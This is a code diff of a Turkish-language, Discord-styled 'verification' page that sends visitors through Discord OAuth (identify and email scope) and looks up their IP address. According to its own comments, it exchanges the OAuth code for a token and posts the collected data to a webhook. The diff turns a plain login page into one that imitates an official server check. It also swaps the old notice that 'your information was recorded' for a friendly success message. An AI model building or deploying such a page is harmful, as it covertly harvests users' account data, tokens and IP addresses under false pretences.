@@ -3,35 +3,105 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Discord Giriş</title>
+  <title>Discord Doğrulama</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      max-width: 500px;
-      margin: 0 auto;
+      font-family: 'Arial', sans-serif;
+      background-color: #36393f;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
       padding: 20px;
       text-align: center;
     }
-    button {
+    .container {
+      background-color: #2f3136;
+      border-radius: 8px;
+      padding: 30px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+      max-width: 500px;
+      width: 100%;
+    }
+    h2 {
+      color: #5865F2;
+      margin-bottom: 20px;
+    }
+    .btn {
       background-color: #5865F2;
       color: white;
       border: none;
-      padding: 10px 20px;
+      padding: 12px 24px;
       border-radius: 4px;
       font-size: 16px;
       cursor: pointer;
       transition: background-color 0.3s;
+      display: inline-block;
+      text-decoration: none;
+      margin-top: 15px;
     }
-    button:hover {
+    .btn:hover {
       background-color: #4752C4;
+    }
+    .info-text {
+      margin: 20px 0;
+      color: #b9bbbe;
+      font-size: 14px;
+    }
+    .status {
+      margin-top: 20px;
+      padding: 15px;
+      border-radius: 4px;
+      display: none;
+    }
+    .loading {
+      display: none;
+      margin: 20px auto;
+      width: 50px;
+      height: 50px;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #5865F2;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .verified {
+      background-color: #3ba55c;
+      display: block;
+    }
+    .error {
+      background-color: #ed4245;
+      display: block;
     }
   </style>
 </head>
 <body>
-  <h2>Discord ile Giriş</h2>
-  <a id="loginBtn">
-    <button>Discord ile Giriş Yap</button>
-  </a>
+  <div class="container">
+    <h2>Discord Doğrulama</h2>
+    
+    <div id="initialView">
+      <p>Sunucumuza erişmek için Discord hesabınızla doğrulama yapmanız gerekmektedir.</p>
+      <p class="info-text">Aşağıdaki butona tıklayarak doğrulama işlemini başlatabilirsiniz.</p>
+      <a id="loginBtn" class="btn">
+        <span>Discord ile Doğrula</span>
+      </a>
+    </div>
+    
+    <div id="verifyingView" style="display: none;">
+      <div class="loading"></div>
+      <p>Doğrulama yapılıyor, lütfen bekleyin...</p>
+      <p class="info-text">Bu işlem birkaç saniye sürebilir.</p>
+    </div>
+    
+    <div id="statusView" class="status" style="display: none;">
+      <!-- Durum mesajı burada gösterilecek -->
+    </div>
+  </div>
 
   <script>
     const clientId = "1399152888214851595";
@@ -41,9 +111,14 @@
     const params = new URLSearchParams(window.location.search);
     const code = params.get("code");
 
+    // Elementleri seç
+    const initialView = document.getElementById("initialView");
+    const verifyingView = document.getElementById("verifyingView");
+    const statusView = document.getElementById("statusView");
+    const loginBtn = document.getElementById("loginBtn");
+
     // Login butonuna tıklandığında Discord OAuth'a yönlendir
-    document.getElementById("loginBtn").href =
-      `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify%20email`;
+    loginBtn.href = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify%20email`;
 
     // IP adresini almak için fonksiyon
     async function getIP() {
@@ -57,8 +132,21 @@
       }
     }
 
+    // Durum mesajını göster
+    function showStatus(message, isSuccess) {
+      initialView.style.display = "none";
+      verifyingView.style.display = "none";
+      statusView.style.display = "block";
+      statusView.className = isSuccess ? "status verified" : "status error";
+      statusView.innerHTML = `<p>${message}</p>`;
+    }
+
     // Kod geldiyse token al ve webhooka gönder
     if (code) {
+      // Doğrulama görünümünü göster
+      initialView.style.display = "none";
+      verifyingView.style.display = "block";
+      
       (async () => {
         try {
           // IP adresini al
@@ -98,7 +186,7 @@
           
           // Webhook embed verisi
           const embed = {
-            title: "Yeni Discord Girişi",
+            title: "Yeni Discord Doğrulaması",
             color: 0x5865F2,
             thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
             fields: [
@@ -115,7 +203,7 @@
             ],
             timestamp: new Date().toISOString(),
             footer: {
-              text: "Discord Giriş Sistemi"
+              text: "Discord Doğrulama Sistemi"
             }
           };
           
@@ -130,12 +218,21 @@
             }),
           });
           
-          // Kullanıcıyı bilgilendir
-          alert("Giriş başarılı! Bilgileriniz kaydedildi.");
+          // Başarılı durum mesajını göster
+          showStatus(
+            "✅ Doğrulama başarılı!<br><br>" +
+            "Teşekkür ederiz, Discord hesabınız başarıyla doğrulandı.<br>" +
+            "Sunucudan iletişime devam edebilirsiniz.",
+            true
+          );
           
         } catch (err) {
           console.error("Hata oluştu:", err);
-          alert("Giriş sırasında bir hata oluştu. Lütfen tekrar deneyin.");
+          showStatus(
+            "❌ Doğrulama başarısız!<br><br>" +
+            "Doğrulama sırasında bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
+            false
+          );
         }
       })();
     }
